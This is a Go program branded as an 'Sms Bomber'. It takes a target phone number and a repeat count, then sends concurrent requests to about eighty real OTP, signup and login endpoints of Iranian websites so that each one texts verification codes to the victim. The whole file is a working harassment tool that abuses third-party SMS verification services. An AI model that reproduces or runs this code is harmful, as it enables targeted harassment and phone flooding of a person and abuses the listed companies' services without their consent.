package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
)

type RequestStatus struct {
	URL        string
	StatusCode int
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- RequestStatus) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- RequestStatus{URL: url, StatusCode: 0}
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	defer resp.Body.Close()

	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- RequestStatus) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m")
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- RequestStatus{URL: url, StatusCode: 0}
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	defer resp.Body.Close()

	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*     
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	var wg sync.WaitGroup
	ch := make(chan RequestStatus, repeatCount*10)

	phoneTrimmed := strings.TrimPrefix(phone, "0")
	phoneInt64, err := strconv.ParseInt(phoneTrimmed, 10, 64)

	if err != nil {
		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Requests to APIs requiring integer format may fail.\033[0m")
	}

	for i := 0; i < repeatCount; i++ {

                // virgool.io (JSON) - identifier
		wg.Add(1)
		go sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
			"identifier": phone,
		}, &wg, ch)
		// virgool.io (JSON) - method and identifier
		wg.Add(1)
		go sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
			"method": "phone", "identifier": phone,
		}, &wg, ch)
		// virgool.io (JSON) - user-existence
		wg.Add(1)
		go sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// cyclops.drnext.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// ebcom.mci.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
			"msisdn": phone,
		}, &wg, ch)
		// account.api.balad.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)
		// api.cafebazaar.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// gamefa.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"digits_phone": phone,
		}, &wg, ch)
		// app.mediana.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)
		// www.anbaronline.ir (JSON) - Captcha site
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.anbaronline.ir/account/sendotpjson", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// appapi.sms.ir (JSON) - Assuming "phone" key
		wg.Add(1)
		go sendJSONRequest(ctx, "https://appapi.sms.ir/api/app/auth/sign-up/verification-code", map[string]interface{}{
			"phone": phone, // Changed "" to "phone" as a likely key
		}, &wg, ch)
		// auth.basalam.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.torob.com (JSON) - Note: User reported issues
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin/", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)
		// app.ezpay.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)
		// ws.alibaba.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)
		// api.achareh.co (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)
		// www.filimo.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1", map[string]interface{}{
			"account": phone,
		}, &wg, ch)
		// nazarkade.com (JSON) - check.mobile.php
		wg.Add(1)
		go sendJSONRequest(ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// nazarkade.com (JSON) - admin-ajax.php
		wg.Add(1)
		go sendJSONRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, &wg, ch)
		// api.motabare.ir (JSON) - Captcha site
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.baloan.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.baloan.ir/api/v1/accounts/login-otp", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)
		// api.mydigipay.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
			"cellNumber": phone,
		}, &wg, ch)
		// www.e-estekhdam.com (JSON) - panel
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// emp.e-estekhdam.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// tikban.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)
		// oteacher.org (JSON) - Captcha site
		wg.Add(1)
		go sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// www.buskool.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.buskool.com/send_verification_code", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)
		// kilid.com (JSON) - Note: Requires dynamic captchaId
		wg.Add(1)
		go sendJSONRequest(ctx, "https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=akah8cgoLOvIfKnE1mx3lXOB4NrXJ0LWIXim8TTe4EETy7EKGJgAtjkFzcfF6M33i2IK8aqmJrg1X1nc59osFA%253D%253D", map[string]interface{}{
			"phone": phone, // Assuming "phone" key, original was ""
		}, &wg, ch)
		// roustaee.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://roustaee.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, &wg, ch)
		// dr-ross.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.epasazh.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// nobat.ir (Form Data) - Note: Payload looks like form data boundary
		wg.Add(1)
		go sendFormRequest(ctx, "https://nobat.ir/api/public/patient/login/phone", url.Values{"mobile": {phone}}, &wg, ch) // Converted to Form Data
		// www.digistyle.com (Form Data) - Note: Payload looks like form data
		wg.Add(1)
		formData := url.Values{}
		formData.Set("loginRegister[email_phone]", phone)
		go sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch) // Converted to Form Data
		// api.snapp.express (JSON) - Note: URL has query params
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b"), map[string]interface{}{
			"cellphone": phone, // Changed "cellphone=" to "cellphone" key
		}, &wg, ch)
		// www.azki.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)
		// api.digikalajet.ir (JSON) - Duplicate, already added in previous list
		// go sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
		// 	"phone": phone,
		// }, &wg, ch)
		// drdr.ir (JSON) - login/mobile/init
		wg.Add(1)
		go sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// gw.taaghche.com (JSON) - login
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/login", map[string]interface{}{
			"contact": phone,
		}, &wg, ch)
		// gw.taaghche.com (JSON) - signup
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
			"contact": phone,
		}, &wg, ch)
		// application2.billingsystem.ayantech.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
			"MobileNumber": phone,
		}, &wg, ch)
		// api.vandar.io (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.mobit.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
			"number": phone,
		}, &wg, ch)
		// api.pinorest.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// service.tetherland.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://service.tetherland.com/api/v5/login-register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// ws.alibaba.ir (JSON) - Duplicate, already added
		// go sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
		// 	"phoneNumber": phone,
		// }, &wg, ch)
		// student.classino.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://student.classino.com/otp/v1/api/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// takshopaccessorise.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
			"mobile_phone": phone,
		}, &wg, ch)
		// api.lendo.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.torob.com (JSON) - send-pin (Duplicate URL, keeping as provided)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)
		// drdr.ir (JSON) - verifyMobile (Duplicate URL base, different path)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://drdr.ir/api/registerEnrollment/verifyMobile", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)
		// app.itoll.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// gateway.telewebion.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)
		// core.gap.im (JSON) - Duplicate URL base, different path
		wg.Add(1)
		go sendJSONRequest(ctx, "https://core.gap.im/v1/user/add.json", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// caropex.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// hamrahsport.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://hamrahsport.com/send-otp", map[string]interface{}{
			"cell": phone,
		}, &wg, ch)
		// harikashop.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://harikashop.com/login?back=my-account", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// www.zzzagros.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		// auth.basalam.com (JSON) - otp-request (Duplicate URL base, different path)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://auth.basalam.com/otp-request", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// arastag.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://arastag.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileemail": phone,
		}, &wg, ch)
		// www.tamimpishro.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api2.fafait.net (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api2.fafait.net/oauth/check-user", map[string]interface{}{
			"id": phone,
		}, &wg, ch)
		// fankala.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, &wg, ch)
		// www.khanoumi.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// filmnet.ir (JSON) - Note: URL has {phone} placeholder
		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://filmnet.ir/api-v2/access-token/users/0%v/otp", strings.TrimPrefix(phone, "0")), map[string]interface{}{ // Assuming 0{phone} means number without leading zero
			"otp:login": phone, // Payload key as provided
		}, &wg, ch)
		// www.namava.ir (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
			"UserName": phone,
		}, &wg, ch)
		// api.doctoreto.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api-react.okala.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)
		// api.snapp.market (JSON) - loginMobileWithNoPass (Duplicate URL base, different path/payload from previous list)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)
		// sabziman.com (JSON)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"phonenumber": phone,
		}, &wg, ch)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)

		wg.Add(1)
		go func(ctx context.Context, url string, pInt64 int64, conversionErr error, wg *sync.WaitGroup, ch chan<- RequestStatus) {
			defer wg.Done()
			if conversionErr == nil {

				payload := map[string]interface{}{
					"mobile": pInt64,
				}
				jsonData, marshalErr := json.Marshal(payload)
				if marshalErr != nil {
					fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}

				req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
				if reqErr != nil {
					fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", reqErr)
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				req.Header.Set("Content-Type", "application/json")

				resp, clientErr := http.DefaultClient.Do(req)
				if clientErr != nil {
					if ctx.Err() == context.Canceled {
						fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
						ch <- RequestStatus{URL: url, StatusCode: 0}
						return
					}
					fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", clientErr)
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				defer resp.Body.Close()
				ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}

			} else {
				ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
			}
		}(ctx, "https://api.nobat.ir/patient/login/phone", phoneInt64, err, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for status := range ch {
		if status.StatusCode >= 400 || status.StatusCode == 0 {
			fmt.Printf("\033[01;31m[-] Error ! \033[0m (Status: %d)\n", status.StatusCode)
		} else {
			fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended\033[0m (Status: %d)\n", status.StatusCode)
		}
	}
}
